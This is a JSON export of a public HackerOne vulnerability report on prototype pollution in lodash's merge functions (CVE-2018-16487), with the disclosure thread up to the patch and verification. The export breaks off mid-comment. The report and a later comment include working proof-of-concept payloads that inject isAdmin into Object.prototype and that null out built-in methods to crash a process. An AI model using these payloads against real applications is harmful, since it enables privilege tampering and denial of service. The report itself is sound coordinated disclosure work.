{"id":380873,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODA4NzM=","url":"https://hackerone.com/reports/380873","title":"Prototype pollution attack (lodash / constructor.prototype)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-07-12T08:28:18.713Z","submitted_at":"2018-07-12T08:28:18.713Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"asgerf","url":"/asgerf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-16487"],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-30T12:59:31.457Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-10-15T15:12:26.682Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a prototype pollution vulnerability in lodash.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** lodash\n**version:** 4.17.10\n**npm page:** `https://www.npmjs.com/package/lodash`\n\n## Module Description\n\nThe Lodash library exported as Node.js modules.\n\n## Module Stats\n\n12M downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nThis is a variant of this vulnerability:\nhttps://hackerone.com/reports/310443\n\nThe functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n\nCraft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.\n\n```javascript\nvar _ = require('lodash');\nvar payload = JSON.parse('{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}');\n_.merge({}, payload);\nconsole.log({}.isAdmin); // true\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nDenial of service, possibly more depending on the application.\nSee https://hackerone.com/reports/310443","vulnerability_information_html":"\u003cp\u003eI would like to report a prototype pollution vulnerability in lodash.\u003cbr\u003e\nIt allows an attacker to inject properties on Object.prototype.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e lodash\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 4.17.10\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/lodash\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eThe Lodash library exported as Node.js modules.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e12M downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThis is a variant of this vulnerability:\u003cbr\u003e\n\u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe functions \u003ccode\u003emerge\u003c/code\u003e, \u003ccode\u003emergeWith\u003c/code\u003e, and \u003ccode\u003edefaultsDeep\u003c/code\u003e can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eCraft an object of form \u003ccode\u003e{constructor: {prototype: {...}}}\u003c/code\u003e and send it to \u003ccode\u003e_.merge\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elodash\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e{\u0026quot;constructor\u0026quot;: {\u0026quot;prototype\u0026quot;: {\u0026quot;isAdmin\u0026quot;: true}}}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emerge\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisAdmin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of service, possibly more depending on the application.\u003cbr\u003e\nSee \u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-11-14T15:12:26.781Z","allow_singular_disclosure_after":-67012463.12099294,"singular_disclosure_allowed":true,"vote_count":14,"voters":["foobar7","bl4de","mygf","macasun","eveeez","skyplabs","cryptographer","0x08","armansameer","m3x","and 4 more..."],"severity":{"rating":"high","score":7.0,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":5914,"asset_type":"SOURCE_CODE","asset_identifier":"lodash","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3037125,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-07-13T06:10:20.475Z","updated_at":"2018-07-13T06:10:20.475Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3037406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @asgerf,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi @asgerf,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-13T08:24:14.523Z","updated_at":"2018-07-13T08:24:14.523Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3038176,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-13T08:42:34.601Z","updated_at":"2018-07-13T08:42:34.601Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3049620,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-16T07:42:20.920Z","updated_at":"2018-07-16T07:42:20.920Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3049636,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the heads up. This is something I'll want to patch right up.","markdown_message":"\u003cp\u003eThanks for the heads up. This is something I\u0026#39;ll want to patch right up.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-16T07:55:40.021Z","updated_at":"2018-07-16T07:55:40.021Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3146317,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton any news on your side?","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e any news on your side?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-06T06:46:16.618Z","updated_at":"2018-08-06T06:46:16.618Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton Checking the GH repo I didn't see any commits in this direction. If you were able to mitigate the prototype pollution attack, could you update this issue please?","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e Checking the GH repo I didn\u0026#39;t see any commits in this direction. If you were able to mitigate the prototype pollution attack, could you update this issue please?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T09:57:54.649Z","updated_at":"2018-08-29T09:57:54.649Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3267116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah sorry, I missed the ping. I have not mitigated the issue yet. ","markdown_message":"\u003cp\u003eAh sorry, I missed the ping. I have not mitigated the issue yet. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T06:44:47.851Z","updated_at":"2018-08-30T06:44:47.851Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3267244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton, this report is over 45 days old so we really should be disclosing. Seeing as lodash is so widely used, I would like to have a fix available before disclosure. Is it feasible to have a fix any time soon?","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e, this report is over 45 days old so we really should be disclosing. Seeing as lodash is so widely used, I would like to have a fix available before disclosure. Is it feasible to have a fix any time soon?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T07:43:15.688Z","updated_at":"2018-08-30T07:43:15.688Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3270650,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah ok, understood. I'll patch it tonight, provide a link to verify the fix, and release tomorrow.","markdown_message":"\u003cp\u003eAh ok, understood. I\u0026#39;ll patch it tonight, provide a link to verify the fix, and release tomorrow.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T16:57:44.995Z","updated_at":"2018-08-30T16:57:44.995Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3272966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Patched [here](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad).\njsbin [here](https://jsbin.com/rimuqaj/1/edit?js,console).","markdown_message":"\u003cp\u003ePatched \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Flodash%2Flodash%2Fcommit%2F90e6199a161b6445b01454517b40ef65ebecd2ad\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\njsbin \u003ca href=\"/redirect?url=https%3A%2F%2Fjsbin.com%2Frimuqaj%2F1%2Fedit%3Fjs%2Cconsole\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-31T07:02:59.110Z","updated_at":"2018-08-31T07:02:59.110Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3276232,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you all verify the patch resolves the issue (a second set of folks poking at it would help).","markdown_message":"\u003cp\u003eCan you all verify the patch resolves the issue (a second set of folks poking at it would help).\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-31T17:31:44.751Z","updated_at":"2018-08-31T17:31:44.751Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3277141,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There are a few more variations; I realize I should have been more explicit in the original report.\n\nDenial of service is still possible, for example by removing `Function.prototype.call`:\n```javascript\nvar payload = {\"toString\": {\"constructor\": {\"prototype\": {\"call\": null}}}}\n_.merge({}, payload);\nconsole.log(function(){}.call(undefined)); // crash\n```\nOr removing `Object.getOwnPropertyNames`:\n```javascript\nvar payload = {\"constructor\": {\"getOwnPropertyNames\": null}}\n```\nI believe Object, Array, Function, Number, String, and Boolean and their prototypes were all originally vulnerable, and the patch only protects Object.prototype.\n\nOne way to guard against this might be to replace a property entirely (rather than recursively extend it) if the destination object doesn't have that property as an own property. That would prevent traversing the built-in `constructor` property, but wouldn't prevent users from using the name `constructor` in other contexts. Or just copy what jquery or another library does to avoid re-inventing the wheel.","markdown_message":"\u003cp\u003eThere are a few more variations; I realize I should have been more explicit in the original report.\u003c/p\u003e\n\n\u003cp\u003eDenial of service is still possible, for example by removing \u003ccode\u003eFunction.prototype.call\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etoString\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econstructor\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eprototype\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ecall\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}}\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emerge\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(){}.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003eundefined\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e \u003cspan class=\"c1\"\u003e// crash\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOr removing \u003ccode\u003eObject.getOwnPropertyNames\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econstructor\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egetOwnPropertyNames\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e}}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI believe Object, Array, Function, Number, String, and Boolean and their prototypes were all originally vulnerable, and the patch only protects Object.prototype.\u003c/p\u003e\n\n\u003cp\u003eOne way to guard against this might be to replace a property entirely (rather than recursively extend it) if the destination object doesn\u0026#39;t have that property as an own property. That would prevent traversing the built-in \u003ccode\u003econstructor\u003c/code\u003e property, but wouldn\u0026#39;t prevent users from using the name \u003ccode\u003econstructor\u003c/code\u003e in other contexts. Or just copy what jquery or another library does to avoid re-inventing the wheel.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-31T21:10:42.999Z","updated_at":"2018-08-31T21:10:42.999Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3277445,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah thanks. I think another patch actually fixed both. Will update the jsbin test case in a couple minutes with a new build (I'll post back with a new link)","markdown_message":"\u003cp\u003eAh thanks. I think another patch actually fixed both. Will update the jsbin test case in a couple minutes with a new build (I\u0026#39;ll post back with a new link)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-31T21:41:35.282Z","updated_at":"2018-08-31T21:41:35.282Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3277571,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok try [this](https://jsbin.com/lewikas/1/edit?js,console)","markdown_message":"\u003cp\u003eOk try \u003ca href=\"/redirect?url=https%3A%2F%2Fjsbin.com%2Flewikas%2F1%2Fedit%3Fjs%2Cconsole\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-31T22:43:46.339Z","updated_at":"2018-08-31T22:43:46.339Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3279113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"lgtm","markdown_message":"\u003cp\u003elgtm\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-01T12:24:54.257Z","updated_at":"2018-09-01T12:24:54.257Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3279989,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok great! Imma try to release this weekend.","markdown_message":"\u003cp\u003eOk great! Imma try to release this weekend.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-02T02:11:39.492Z","updated_at":"2018-09-02T02:11:39.492Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3480459,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-15T08:22:28.559Z","updated_at":"2018-10-15T08:22:28.559Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"asgerf","url":"/asgerf"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3480607,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"@jdalton sorry for the radio silence. Could you point me to the release? ","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e sorry for the radio silence. Could you point me to the release? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T08:34:18.686Z","updated_at":"2018-10-15T08:34:18.686Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3480686,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I 